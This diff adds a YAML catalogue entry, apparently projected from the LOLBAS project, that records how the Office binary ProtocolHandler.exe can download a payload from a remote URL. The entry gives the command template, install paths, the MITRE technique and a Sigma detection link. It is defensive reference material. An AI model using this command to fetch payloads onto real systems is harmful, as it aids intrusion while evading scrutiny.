@@ -1,0 +1,98 @@
+id: lolbas/T3RoZXJNU0JpbmFyaWVzL1Byb3RvY29sSGFuZGxlci55bWw/RG93bmxvYWQ/0
+type: binary
+platform: windows
+name: ProtocolHandler.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  triggers: Suspicious Office application Internet/network traffic
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_lolbin_protocolhandler_download.yml
+commands:
+- template: ProtocolHandler.exe {REMOTEURL}
+  comment: Downloads payload from remote server
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/ProtocolHandler/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: ProtocolHandler.exe
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OtherMSBinaries/ProtocolHandler.yml
+      command_source_index: 0
+      document_utf8: "---\nName: ProtocolHandler.exe\nDescription: Microsoft Office binary\nAuthor: Nir\
+        \ Chako\nCreated: 2022-07-24\nCommands:\n  - Command: ProtocolHandler.exe {REMOTEURL}\n    Description:\
+        \ Downloads payload from remote server\n    Usecase: \"It will open the specified URL in the default\
+        \ web browser, which (if the URL points to a file) will often result in the file being downloaded\
+        \ to the user's Downloads folder (without user interaction)\"\n    Category: Download\n    Privileges:\
+        \ User\n    MitreID: T1105\n    OperatingSystem: Windows 10, Windows 11\nFull_Path:\n  - Path:\
+        \ C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\ProtocolHandler.exe\n\
+        \  - Path: C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\ProtocolHandler.exe\n\
+        \  - Path: C:\\Program Files (x86)\\Microsoft Office\\Office16\\ProtocolHandler.exe\n  - Path:\
+        \ C:\\Program Files\\Microsoft Office\\Office16\\ProtocolHandler.exe\n  - Path: C:\\Program Files\
+        \ (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\ProtocolHandler.exe\n  - Path: C:\\Program\
+        \ Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\ProtocolHandler.exe\n  - Path: C:\\Program\
+        \ Files (x86)\\Microsoft Office\\Office15\\ProtocolHandler.exe\n  - Path: C:\\Program Files\\\
+        Microsoft Office\\Office15\\ProtocolHandler.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_lolbin_protocolhandler_download.yml\n\
+        \  - IOC: Suspicious Office application Internet/network traffic\nAcknowledgement:\n  - Person:\
+        \ Nir Chako (Pentera)\n    Handle: '@C_h4ck_0'\n"
+      document_sha256: sha256:894b42ce85e4cade47ce98814c2fb78fa27c325940a8569d40fe4fa5b823b9a8
+    upstream_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/ProtocolHandler/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:bc1c90d95c1711988c6b4f1f2941a49421750e928f999b1eac911686f93e47f0
